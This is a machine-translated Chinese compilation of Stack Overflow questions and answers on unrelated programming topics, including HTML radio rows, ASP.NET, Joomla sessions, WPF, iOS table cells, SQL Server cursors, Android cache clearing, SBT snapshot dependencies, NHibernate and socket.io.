我有一个包含 2 列的 HTML 表，其中 1 列 hsa 单选按钮。现在要选择一个收音机，我必须单击单选按钮本身。如果我单击单选单元格 () 上的任意位置或其行 () 上的任意位置，如何选择单选按钮？

这是代码：

```
<tr>                     
<TD><INPUT type="radio" name="Radios" value="someValue"></td> 
<TD>someValue</td> 
</tr> 
```

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-10-20T07:39:54.233

将您的文本放入此标签：

```
<label for="Radios">someValue</label> 
```

您必须将 id="radios" 添加到您的输入标签中

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:55:46.013

在调用`click`其 INPUT 子元素排序的行上放置一个单击事件处理程序。在这里试试：http: [//jsfiddle.net/59p9s/](http://jsfiddle.net/59p9s/)

```
<script type="text/javascript">
function handleRadioRow() {
    var t = event.target;
    if (t.tagName.toUpperCase() == "INPUT")
        return;
    while (t.tagName.toUpperCase() != "TR")
        t = t.parentElement;
    var r = t.getElementsByTagName("input")[0];
    r.click();
}
</script>

<table>
  <tr onclick="handleRadioRow()" style="cursor: pointer;">
    <TD><INPUT type="radio" name="Radios" value="someValue"></td> 
    <TD>someValue</td> 
  </tr>
  <tr onclick="handleRadioRow()" style="cursor: pointer;">
    <TD><INPUT type="radio" name="Radios" value="someValue"></td> 
    <TD>someValue</td> 
  </tr>
</table> 
```

# asp.net - 从控制台应用程序设置 HttpContext.Current.Application

> ID：12213677
> 
> 赞同：1
> 
> 时间：2012-08-31T10:39:06.610
> 
> 标签：asp.net, console-application

我正在创建一个控制台应用程序，它需要调用严重依赖 HttpContext 的方法。我可以模拟基本 HttpContext 以及身份验证，但我无法设置 HttpContext.Current.Application。有没有可能在其中设置数据？

这里有几个关于同一主题的问题，但无法从任何一个那里得到解决方案，因此最终在这里发布了另一个问题。

我的目标是让这个工作。

```
HttpContext.Current.Application("PageDefinitionCache") = pageDefinitions 
```

请问有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-19T12:38:51.340

缓存位于 ASP.NET 工作进程中，您不能直接从控制台应用程序访问它。`HttpContext.Current`是`null`因为您不在控制台应用程序中使用 aspx.net 工作进程。

考虑在控制台应用程序中声明一个全局变量来模拟`HttpContext.Current.Application`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-04T13:01:30.110

您不能在控制台应用程序中使用 HttpContext。正如@matrxRapture 所述，您可以通过使用全局变量来解决此问题，如果您正在寻找应用程序的当前目录路径，您可以使用**Assembly.GetExecutingAssembly().Location**

# php - 如何检查 JFactory::getSession() 中的会话是否已设置？

> ID：12213678
> 
> 赞同：1
> 
> 时间：2012-08-31T10:39:06.563
> 
> 标签：php, joomla, joomla2.5

`viewform.php`鉴于组件，我在 joomla 2.5 中有以下几行

```
 $session = & JFactory::getSession();
 if(empty($session->get('MasterIndex'))) $session->set('MasterIndex',0); 
```

我得到

> 致命错误：无法在 /var/www/ 的写入上下文中使用方法返回值 ..

我也试过

```
 if(empty($session->get('MasterIndex'))) $session->set('MasterIndex',0); 
```

如何检查会话值是否已设置？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T10:43:32.293

尝试：

```
$session =& JFactory::getSession();
$setSession = $session->get('MasterIndex');
if(empty($setSession)) $session->set('MasterIndex',0); 
```

注意：您收到该错误是因为[empty()](http://php.net/manual/en/function.empty.php)仅检查变量，因为其他任何内容都会导致解析错误

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:48:23.613

```
$session =& JFactory::getSession();
$setSession = $session->get('MasterIndex');
if(empty($setSession)) 
{
    $s_var = $session->set('MasterIndex',0);
}
else
{
    $s_var = $session->set('MasterIndex',1);
}

echo $s_var; 
```

试试这个.....

# c# - 如何以编程方式计算 WPF 中的列/条段宽度？

> ID：12213682
> 
> 赞同：-1
> 
> 时间：2012-08-31T10:39:26.827
> 
> 标签：c#, wpf, silverlight

我用不同的关键字搜索了很多次，但找不到用于绘制不同图表的电子书。

好的，我的问题是我正在绘制柱形图，我希望柱形图根据它拥有的段数来计算段宽度。有谁知道我该怎么做？

谢谢并恭祝安康，

毛伊

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:15:28.723

尝试使用 WPF 工具包，参考 System.Windows.Controls.DataVisualization.Toolkit.dll 。[您可以在这里](http://www.c-sharpcorner.com/UploadFile/mahesh/charting-in-wpf/)找到一些示例，它应该非常简单，创建包含您的数据的 KeyValuePair 集合，然后绑定到 Key 和 Value 属性。[更多关于这里](http://www.c-sharpcorner.com/uploadfile/mahesh/column-chart-in-wpf/)的柱形图。如果您使用它，则不需要为列的宽度或高度进行额外的工作。

# wpf - CheckBox UserControl 始终选中

> ID：12213685
> 
> 赞同：0
> 
> 时间：2012-08-31T10:39:33.660
> 
> 标签：wpf, checkbox, user-controls, mainwindow

我有一个名为 RateView.xaml.cs 的用户控件。此用户控件包含一个名为 CheckBox1 的复选框。我把这个用户控件放在我的 MainWindow 上 5 次。我需要 MainWindow 上的三个用户控件才能从应用程序启动时启用复选框。如何实现？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:42:38.630

在 上创建一个[依赖属性](http://msdn.microsoft.com/en-us/library/ms752914.aspx) ，将其[绑定](http://msdn.microsoft.com/en-us/library/ms752347.aspx)到*内部*，在 的实例上相应地设置该属性。`IsChecked``UserControl` *`CheckBox``UserControl`*

# objective-c - 无法设置 UITableViewCell 的 contentView 的框架

> ID：12213687
> 
> 赞同：1
> 
> 时间：2012-08-31T10:39:44.297
> 
> 标签：objective-c, uitableview

我试图设置我的 UITableViewCell 的 contentView 的偏移量。但是失败了。如图所示，没有偏移。

![在此处输入图像描述](../Images/8033d87db038a49c3fe7af816253bac6.png)

对应的代码如下。

**我的细胞**

```
#import "MyCell.h"

@implementation MyCell

- (id)initWithStyle:(UITableViewCellStyle)style reuseIdentifier:(NSString *)reuseIdentifier
{
self = [super initWithStyle:style reuseIdentifier:reuseIdentifier];
if (self) {
    // Initialization code
    UIView *backGroundView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, self.bounds.size.width, self.bounds.size.height)];
    [backGroundView setBackgroundColor:[UIColor grayColor]];
    [self addSubview:backGroundView];

    UIView *frontView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, self.bounds.size.width, self.bounds.size.height)];
    [frontView setBackgroundColor:[UIColor greenColor]];

    UILabel *myLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, self.bounds.size.width, self.bounds.size.height)];
    myLabel.text = @"My Cell";
    myLabel.backgroundColor = [UIColor clearColor];
    [myLabel setTextAlignment:UITextAlignmentCenter];
    [frontView addSubview:myLabel];

    [self.contentView addSubview:frontView];

    [self bringSubviewToFront:self.contentView];

}
return self;
} 
```

**MyTableViewController.m**

```
#import "MyTableViewController.h"

#pragma mark - Table view data source

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
return 1;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
static NSString *CellIdentifier = @"MyCell";

MyCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
if (cell == nil) {
    cell = [[MyCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
}

CGPoint center = cell.center;
center.x = cell.contentView.bounds.size.width/2 - 20;
[cell.contentView setCenter:center];

NSLog(@"origin.x :%f ,y :%f, width :%f, height :%f",cell.contentView.frame.origin.x, cell.contentView.frame.origin.y, cell.contentView.frame.size.width,cell.contentView.frame.size.height);

return cell;
} 
```

**日志**

```
2012-08-31 18:29:34.075 TableViewCellOffsetTest[16169:207] origin.x :-20.000000 ,y :0.000000, width :320.000000, height :44.000000 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:56:45.803

向我们展示您与 [cell.contentView setCenter:center] 相关的代码；我怀疑您正在尝试移动单元格的主视图。我不会那样做，我会添加一个子视图并抵消它并将您的内容视图添加到它。由于您已经在使用自定义方法，因此您需要在此处进行所有更改。此外值得注意的是，您还希望在每次重用时重置单元格偏移量，因为您最终会越来越远地移动内容。

# sql-server - 使用 sp_executesql 在 sql server 2012 中声明不敏感游标

> ID：12213688
> 
> 赞同：1
> 
> 时间：2012-08-31T10:39:44.690
> 
> 标签：sql-server, cursor, sql-server-2012

我有一个使用游标的存储过程；它是用 SQL Server 2005 编写的，在 SQL Server 2008 之前运行良好。

我们最近决定迁移到 SQL Server 2012，并尝试将我们所有的数据库迁移到新环境，但是这个存储过程在打开游标时失败。

这是部分：

```
BEGIN TRY
        SELECT @SqlStatement =  'DECLARE cursorMoveStatements  INSENSITIVE CURSOR  FOR ' 
                                + 'Select [name],[status] From  [' + @ServerName 
                                +'].['+ @DBName 
                                + '].sys.sysfiles FOR READ ONLY'
        EXEC sp_executesql @SqlStatement

            OPEN cursorMoveStatements
    ..... --Do Some Stuff
        END TRY 
```

`@ServerName`并且`@DBName`更早地被适当地声明和设置。运行时，错误表明当我尝试打开它时未设置 cursorMoveStatements。

我知道我可以设置一个包含游标的变量，然后将其传递给 sp_executesql 并通过其 OUTPUT 关键字获取设置的游标，但这将迫使我重写该 SP 的大部分（这真的很长）。我想知道 SQL Server 中发生了什么变化导致这部分（在旧版本的 SQL 中运行良好）失败。我搜索了 MSDN，但找不到关于现在有什么不同的线索。

任何帮助，如果不是“修复”这个问题，至少让我了解 SQL Server 2012 中有什么不同之处导致它不起作用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:43:40.743

您的答案可能在[cursor name scope](http://msdn.microsoft.com/en-us/library/ms189238%28v=sql.105%29.aspx)的文档中。具体而言，有关以下信息`CURSOR_DEFAULT`：

> **如果未指定LOCAL**或**GLOBAL ，则使用****ALTER DATABASE**语句设置的数据库选项**CURSOR_DEFAULT控制****DECLARE CURSOR**语句采用的默认值。

 ******您的新 SQL Server 2012 数据库可能`CURSOR_DEFAULT`与您的 SQL Server 2005 数据库不同。

[`ALTER DATABASE SET Option`](http://msdn.microsoft.com/en-us/library/bb522682.aspx)`CURSOR_DEFAULT`更详细地描述了如何工作：

> CURSOR_DEFAULT { 本地 | GLOBAL }
> 控制游标范围是使用 LOCAL 还是 GLOBAL。
> 
> LOCAL
> 如果指定了 LOCAL 并且在创建游标时未将游标定义为 GLOBAL，则游标的范围对于创建游标的批处理、存储过程或触发器是本地的。游标名称仅在此范围内有效。游标可以被批处理、存储过程或触发器中的局部游标变量或存储过程的 OUTPUT 参数引用。当批处理、存储过程或触发器结束时，游标会被隐式释放，除非它在 ​​OUTPUT 参数中传回。如果游标在 OUTPUT 参数中传回，则当引用它的最后一个变量被释放或超出范围时，游标将被释放。
> 
> GLOBAL
> When GLOBAL is specified, and a cursor is not defined as LOCAL when created, the scope of the cursor is global to the connection. The cursor name can be referenced in any stored procedure or batch executed by the connection.******

# android - Android 退出时清除外部图像缓存

> ID：12213693
> 
> 赞同：2
> 
> 时间：2012-08-31T10:39:56.890
> 
> 标签：android, caching

如何执行 Clear(); 在另一个活动的 FileCache.class 中。我正在展示我的编码的一小部分。我的目标是在每次退出时清除外部缓存文​​件。谁能告诉我它是如何完成的。谢谢

FileCache.class

```
public class FileCache {

    private File cacheDir;

    public FileCache(Context context){
        //Find the dir to save cached images
        if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED))
            cacheDir=new File(android.os.Environment.getExternalStorageDirectory(),"LazyList");
        else
            cacheDir=context.getCacheDir();
        if(!cacheDir.exists())
            cacheDir.mkdirs();
    }

    public File getFile(String url){
        //I identify images by hashcode. Not a perfect solution, good for the demo.
        String filename=String.valueOf(url.hashCode());
        //Another possible solution (thanks to grantland)
        //String filename = URLEncoder.encode(url);
        File f = new File(cacheDir, filename);
        return f;

    }

    public void clear(){
        File[] files=cacheDir.listFiles();
        if(files==null)
            return;
        for(File f:files)
            f.delete();
    }

} 
```

MyMainActivity.class

```
@Override
        public void onBackPressed() {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setMessage("Do you want to exit?")
                   .setCancelable(false)
                   .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                       public void onClick(DialogInterface dialog, int id) {

                           Intent intent = new Intent(Intent.ACTION_MAIN);
                           intent.addCategory(Intent.CATEGORY_HOME);
                           intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                           startActivity(intent);
                           new clear();  //<<--- How do i Call clear(); in FileCache.class
                           System.exit(0);
                       }
                   })
                   .setNegativeButton("No", new DialogInterface.OnClickListener() {
                       public void onClick(DialogInterface dialog, int id) {
                            dialog.cancel();
                       }
                   });
            AlertDialog alert = builder.create();
            alert.show();

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:46:56.313

试试这个。

```
public void onClick(DialogInterface dialog, int id) {

                               Intent intent = new Intent(Intent.ACTION_MAIN);
                               intent.addCategory(Intent.CATEGORY_HOME);
                               intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                               startActivity(intent);
                               FileCache loader = new FileCache(null);
                               loader.clear();  
                               System.exit(0);
                           } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:53:25.907

像这样的东西？

```
public void onClick(DialogInterface dialog, int id) {
    new  FileCache( MyMainActivity.this ).clear();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:51:11.827

我相信您已经实现了[Android 中图像延迟加载](https://github.com/thest1/LazyList)的解决方案。

ImageLoader 类中已经给出了 clearCache() 方法：

```
 public void clearCache() {
        memoryCache.clear();
        fileCache.clear();
    } 
```

因此，您可以通过调用 clearCache() 方法清除缓存，如下所示：

```
ImageLoader imgLoader = new ImageLoader(mContext);
imgLoader.clearCache(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T10:53:46.797

您需要对 FileCache 对象的引用。我想你在`onCreate()`from 活动中创建它。如果是这样，请使 FileCache 成为活动的属性。这样，您就可以`myFileCacheReference.clear()`从`onBackPressed()`.

```
public class MainActivity extends Activity {
  private FileCache myFileCacheRef;

  public void onCreate(Bundle b) {
    //standard stuff
    myFileCacheRef = new FileCache();
  }

  public void onBackPressed() {
    myFileCacheRef.clear();
  }
} 
```

像这样的东西应该工作。

# scala - SBT 取决于特定的快照版本

> ID：12213696
> 
> 赞同：14
> 
> 时间：2012-08-31T10:39:59.557
> 
> 标签：scala, maven, sbt

我有多个快照版本的工件，例如`artifact-0.1-20120831.103456-5`.

我的项目取决于特定的快照版本。如果我告诉 SBT 下载`0.1-20120831.103456-5`版本而不是`0.1-SNAPSHOT`更新任务失败。

```
// build.sbt
libraryDependencies ++= Seq(
"com.example" % "smith" % "0.1-20120906.110133-36") 
```

* * *

```
// sbt update
[warn] ==== My Repo snapshots: tried
[warn]   http://repo.localhost/snapshots/com/example/smith/0.1-20120906.110133-36/commons-0.1-20120906.110133-36.pom 
```

如何在[http://repo.localhost/snapshots/com/example/smith/0.1-SNAPSHOT](http://repo.localhost/snapshots/com/example/smith/0.1-SNAPSHOT)目录中制作 SBT 搜索工件但使用唯一的快照版本？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-15T11:23:22.050

**补充**除了独特的版本插件，sbt 还有 aether-deploy 插件（见下文）。

有一个[独特的版本插件](https://github.com/sbt/sbt-unique-version)可以让你解决你想要的工件。从页面引用：

> 如何指向它
> 
> ```
> "0.1.0" or "0.1.0-20120602-073010" you can always use the static version number.
> "0.1.0-+" selects the latest 0.1.0 snapshot.
> "latest.integration" selects the latest revision regardless of its status.
> "latest.milestone" selects the latest revision with either Milestone or Release status.
> "latest.release" selects the latest with the Release status. 
> ```

但是您还必须使用此插件发布，因为工件以与版本有关的不同方式发布：在您的示例中，工件不会存储在 0.1-SNAPSHOT 目录下，而是存储在 0.1-20120831.103456-5 下

**另外** 还有使用[Aether的](http://www.sonatype.com/people/2010/08/introducing-aether/)[aether-deploy 插件](https://github.com/arktekk/sbt-aether-deploy)（Aether 提供了与 Maven 存储库交互的标准方式）。问题是这个插件目前仅适用于部署（正如插件名称所暗示的那样）。也许作者计划对其进行扩展，以便它也可以用于解析（听起来对我来说是一个有用的功能）。如果您无法使用唯一版本插件发布（例如，如果快照不属于您），那么您可以在[sbt 论坛上](https://groups.google.com/forum/#!forum/simple-build-tool)询问。

因此，我无法提供与 maven 一样适用于您的用例的解决方案，但希望它能为您和其他人提供一些有用的信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-10T13:40:23.607

一个丑陋的解决方法是将快照工件安装在您自己的 groupId（比如 smith.external）中，而不是作为 SNAPSHOT，使用 install:instal-file 并声明所需的版本号，而不是声明快照的使用。

由于您不希望版本发生变化，因此您可以依赖它，直到您让它与提供的稳定版本（和常规 groupId）一起使用

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-11T19:51:53.523

不是最好的解决方案，但您可以尝试使用 Ivy 提供的冲突管理器[（请参阅 apache 文档）](http://ant.apache.org/ivy/history/2.2.0/settings/conflict-managers.html)。例如，默认使用“最新修订”，“最新兼容”管理器应禁止任何依赖冲突。

不过，设置起来并不容易， google sbt group 上的[某个人](https://groups.google.com/d/msg/simple-build-tool/QaUqbjjq7aY/y2pgsRQo82wJ)发布了以下规则：

```
def addConflictManager(org: String, name: String, conflictManager: String) =
  ivyModule <<= (ivyModule, streams) map { (module, s) =>
    module.withModule(s.log) { (ivy, desc, _) =>
        import _root_.org.apache.ivy.{core, plugins}
        import core.module.id.ModuleId
        import plugins.matcher.PatternMatcher

        desc.addConflictManager(
          ModuleId.newInstance(org, name),
          ivy.getSettings.getMatcher(PatternMatcher.EXACT),
          ivy.getSettings.getConflictManager("latest-compatible"))
        module
    }
  } 
```

# php - 如何在php中检索比较时间的数据

> ID：12213701
> 
> 赞同：0
> 
> 时间：2012-08-31T10:40:33.990
> 
> 标签：php, json, time

我的代码：

```
$query =    "INSERT IGNORE INTO `user_app` (app_id,imei, package_name, sdk_name, sdk_version, app_version)
                VALUES 
                ('".$appid."','".$imei."', '".$pkg."', '".$sdkn."', '".$sdkv."', '".$appv."')"; 

    $mysqli -> query($query);

    $id = $mysqli -> insert_id ; //get last user insert id

    $idt = date('G:i:s', time());

    $new = strtotime($idt);

    include('requestad.php'); 
```

当一个新用户注册时，他会从 requestad.php 获得一个 json 格式的广告。插入 id 保存在一个名为 $id 的单独变量中，如果用户再次通过应用程序点击（因为应用程序在每 30 分钟后调用一次），那么他将再次获得 json 广告。我正在尝试做一些事情，比如用户在整个 24 小时内只收到一次广告，这可以通过插入 id 和插入时间戳来实现。我正在做这样的事情：

```
if ( $new == time() ) {

        include('requestad.php');

    } elseif ( $new < time() ) {

            echo 'nothing';

    } 
```

但问题是我没有在变量中保存确切的执行时间，并且保存时间对于比较是必要的。另外，如果他再次请求资源，我必须向用户发送一些空白。请看看这个并帮助我产生最佳解决方案。我仍然没有应用任何逻辑。我可以通过静态存储时间来实现这一点，并将其与显示实时的 time() 进行比较。我还在看这个

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T11:37:51.127

```
$store_time=$row['time'];//pick up the store time of user 

$store_time=strtotime($row['time']);//and convert it in strtotime.if alredy did no need to do this.

$new=strtotime("-24 hours",strtotime(time()));//substract the time to -24 hours.

if($new==$store_time)
{
//your code
}
else
{
//your code
} 
```

# ios - 使 UIButton 充当导航控制器

> ID：12213703
> 
> 赞同：0
> 
> 时间：2012-08-31T10:40:39.993
> 
> 标签：ios, uinavigationcontroller, uibutton

如何使常规 UIButton 充当导航控制器，以便在按下它时可以打开新视图？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:49:46.120

假设您在项目中使用 UINavigation 控制器。

然后对于按钮操作只需调用

```
[yourUIButton addTarget:self action:@selector(buttonAction:) forControlEvents:UIControlEventTouchUpInside]; 
```

对于被调用的方法，只需执行以下操作：

```
-(void)buttonAction{
    [self.navigationController pushViewController:YourViewController animated:YES];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:50:09.737

按以下方式在 viewDidLoad 方法中创建 yourButton...

```
UIButton *yourButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
[yourButton setTitle:@"YearButton" forState:UIControlStateNormal];
yourButton.frame = CGRectMake(240, 40, 75, 30);     
[yourButton addTarget:self action:@selector(buttonSelected:) forControlEvents:UIControlEventTouchUpInside]; 
[self.view addSubview:yourButton]; 
```

这是您的方法代码和 createViewController，它是 CreateViewController 类的对象，它在 .h 文件中声明.....

```
-(void) buttonSelected:(id)sender{
   if (!createViewController) {
                createViewController = [[CreateViewController alloc] initWithNibName:@"CreateViewController" bundle:nil];

            }

            [self.navigationController pushViewController:createViewController animated:YES];

 } 
```

我想这会对你有所帮助。

# c# - 对 SqlDataSource 感到困惑

> ID：12213711
> 
> 赞同：1
> 
> 时间：2012-08-31T10:41:20.293
> 
> 标签：c#, .net, asp.net-3.5, sqldatasource, dataview

在我的 C# 代码中，我使用这样的连接字符串：

```
connection = new SqlConnection(ConfigurationManager.AppSettings["myconnectionstring"]) 
```

效果很好。

我现在正在尝试使用`<asp:SqlDataSource`控件，但我似乎无法在控件中使用上述连接字符串，如下所示：

```
<asp:SqlDataSource ID="SqlDataSource1" runat="server"   
ConnectionString="<%$ ConfigurationManager.AppSettings["myconnectionstring"] %>"   
SelectCommand="SELECT * from table1"></asp:SqlDataSource> 
```

我收到一条错误消息：

> 解析器错误消息：服务器标记格式不正确。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:53:27.287

它不是你在那里运行的代码，而是一个[占位符：](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.sqldatasource.connectionstring)它基本上告诉 DataSource '在配置文件中查找一个名为 ConnectionStrings 的配置块，如果你发现它从带有键 myconnectionstring 的元素中获取值'

```
<asp:SqlDataSource ID="SqlDataSource1" runat="server"    
ConnectionString="<%$ ConnectionStrings:myconnectionstring%>"    
SelectCommand="SELECT * from table1"></asp:SqlDataSource> 
```

记得在 app.config 部分 ConnectionStrings 中添加您的连接字符串，

```
<connectionStrings>
  <add name="myconnectionstring" connectionString="server=localhost;database=Northwind;user=north;password=north;" providerName="System.Data.SqlClient" />
</connectionStrings> 
```

特别是因为[你想保护他们的安全](http://msdn.microsoft.com/en-us/library/ms178372%28v=vs.90%29)

# c# - 如何将 NHibernate 中的检索操作放入事务中？

> ID：12213712
> 
> 赞同：1
> 
> 时间：2012-08-31T10:41:25.513
> 
> 标签：c#, nhibernate, transactions

将所有数据库调用放入事务中似乎是最佳实践。所以，我想在事务中放置一个选择操作，但我找不到如何做到这一点。

我已经尝试过这段代码，但出现错误：

```
using (var session = GetSession().SessionFactory.OpenSession())
using (var transaction = session.BeginTransaction())
{
    // var session = GetSession();
    var result = session.Query<I>().Where(condition);

    transaction.Commit();

    return result;
} 
```

错误：

> 会话关闭！对象名称：'ISession'。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T11:14:27.653

这不是问题`Transaction`本身，虽然我只使用事务进行保存/更新调用，而不是选择，但这可能是一个偏好问题（或者我根本不知道一些重要的事情）。

问题是，在关闭会话之前，您并没有“实现”集合。这应该有效：

```
var result = session.Query<I>.Where(condition).List();

return result; 
```

`Where`本身不做任何事情。这意味着您只是推迟执行过滤器，直到您对它进行*某些*操作- 例如对其进行迭代。如果到那时您已超出 Session 范围（看起来您已经超出了），您将收到异常，因为在会话关闭时您无法调用数据库。

尽管您*可能*无法访问延迟加载的子项而不`Fetch`先急切地访问它们 - 当您不在打开的会话中时，您无法通过代理调用数据库。:)

*免责声明*

顺便说一句，同样的事情会发生在带有 LINQ 的 EF 中：

```
IEnumerable<I> myObjects;

using(var context = new MyDbContext())
{
    myObjects = context.Set<I>.Where(x => x.Name == "Test");
}

foreach(obj in myObjects)
{
    var name = obj.Name; //BOOM! Context is disposed.
} 
```

# javascript - 通过 node.js 和 socket.io 在两个用户之间发送消息

> ID：12213713
> 
> 赞同：2
> 
> 时间：2012-08-31T10:41:28.277
> 
> 标签：javascript, node.js, socket.io

我是 node.js 和 socket.io 的新手

我有两个客户端，它们的 ID 为 1 和 2。我需要通过 socket.io 发送数据，其中包含：user_from、user_to、action

并且数据是从双方发送的。

如何使用 socket.emit() 从客户端 1 发送这些数据，以便设置变量：数据？

如何使用 socket.get 在服务器上读取该数据？

并再次从服务器发送到客户端 2 ？（我找到了这段代码：io.sockets.volatile.emit('broadcast_msg', msg); 但我只想将它从特定用户发送到特定用户，而不是所有连接的用户。）

谢谢你的帮助，我看到很多例子，但不是我需要的。

更新：

我不明白这段代码：

```
// on server started we can load our client.html page
function handler(req, res) {
  fs.readFile(__dirname + '/client.html', function(err, data) {
    if(err) {
      console.log(err);
      res.writeHead(500);
      return res.end('Error loading client.html');
    }
    res.writeHead(200);
    res.end(data);
  });
} 
```

为什么我需要这样做？我有 ex: index.php?menu=30 或 index.php?menu=30&action=12

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:11:18.770

您正在寻找路由功能。socket.io 提供的是点对点通信。例如，从 1 个客户端到服务器。

所以从逻辑上讲，您需要服务器来路由消息，这意味着消息应该具有寻址信息（例如目标收件人的 ID）。然后，这可以用于路由消息，例如，通过创建（自定义）用户特定事件以根据传入消息的目标用户触发。

如果你正在构建任何需要扩展的东西，也许你应该看看像 RabbitMQ 这样的消息传递框架。它的确切含义是在分布式实体（如用户）之间路由消息。

干杯!

# iphone - 访问，从单个 nib 获取对多个视图的引用

> ID：12213715
> 
> 赞同：1
> 
> 时间：2012-08-31T10:41:43.067
> 
> 标签：iphone, ios, xib, nib

在表格视图中，我正在插入具有重用标识符的单元格。所以，我必须为每个单元格创建一个 nib (xib) 文件。我想将所有单元格视图放在一个 xib 文件中并单独获取对它们的引用。这个怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:08:37.487

您可以将 xib 作为视图数组访问，就像这样：

```
-(UITableViewCell *) viewCellForSection:(NSInteger) section
{
    UITableViewCell *view = nil;

    NSArray* views= [[NSBundle mainBundle] loadNibNamed:@"myXib" owner:self options:nil];

    switch ( section) {
        case 0: 
            view = (UITableViewCell*) [views objectAtIndex:1];
            break;
        case 1: 
            view = (UITableViewCell*) [views objectAtIndex:0];
            break;
        default: 
            view = (UITableViewCell*) [views objectAtIndex:2];
    }
    return view;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-04T17:00:45.033

我知道这是一个旧线程，但是当我尝试在 UITableViewCells 的 nib 中拥有多个视图时，我实际上在日志中找到了响应。这是日志：

```
*** Terminating app due to uncaught exception 'NSInternalInconsistencyException',
reason: 'invalid nib registered for identifier (cellIdentifier) - nib must
contain exactly one top level object which must be a UITableViewCell instance' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:58:16.890

您必须在方法中实现代码`(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath`。当您选择表格中的单元格时，将调用此方法。这就是为什么你必须实现你想要的。

希望下面的代码对你有所帮助。

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

// yourObject is object of yourViewController and you can declare it .h file.

                    if (!yourObject) {
                    yourObject = [[yourViewController alloc] initWithNibName:@"yourViewController" bundle:nil];

                }

                UIBarButtonItem *backBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Back" style:UIBarButtonItemStylePlain target:nil action:nil];
                self.navigationItem.backBarButtonItem = backBarButtonItem;
                [backBarButtonItem release];
                [self.navigationController pushViewController:yourObject animated:YES];

    } 
```

# c# - 连接不同的编程语言

> ID：12213717
> 
> 赞同：0
> 
> 时间：2012-08-31T10:41:47.587
> 
> 标签：c#, c++, winforms

如何连接两种不同的编程语言？例如，我开发了一个由 C# 编写的应用程序，我还有另一个由 C++ 编写的应用程序，我想知道如何连接它们？

我应该在 Visual Studio 的同一个项目中执行此操作还是执行其他操作？

如何制作一个结合了不同语言的应用程序？如何结合不同的编程语言？

任何帮助将不胜感激

提前致谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T10:44:06.040

你想让这两个程序相互通信吗？有很多方法可以做到这一点。最常见的可能是套接字、命名管道和共享内存。

命名管道和共享内存只有在两个程序在同一台本地机器上运行时才有效，而套接字当然可以在网络上使用。如果必须通过网络进行通信，您还可以查看诸如[RabbitMQ](http://en.wikipedia.org/wiki/Rabbitmq)或类似的消息队列。

**编辑：**阅读您的评论，您似乎并不真正想要两个单独的程序，而是一个使用不同编程语言的程序。

在这种情况下，您可能应该将 C++ 代码制作为 DLL，然后使用例如[P/Invoke](http://en.wikipedia.org/wiki/Platform_Invocation_Services)将其加载到 C# 程序中。

# sql - 有聚集索引的表数据如何存储

> ID：12213721
> 
> 赞同：3
> 
> 时间：2012-08-31T10:41:56.850
> 
> 标签：sql, indexing, clustered-index

我发现了很多帖子，这些帖子的开头就像**很多时候我遇到过的人说“聚簇索引基于聚簇索引键对表内的数据进行物理排序”。这不是真的！**然后这些帖子继续描述它是如何通过链接列表或其他方式实际存储的。例如，这篇[文章](http://sqlwithmanoj.wordpress.com/2011/03/02/clustered-vs-nonclustered-indexes-and-data-sorting/)说

> 每个索引行包含一个键值和一个指向 B 树中的中间级别页面或索引叶级别中的数据行的指针。索引的每个级别中的页面都链接在一个双向链接列表中。数据链中的页面和其中的行按聚集索引键的值排序。

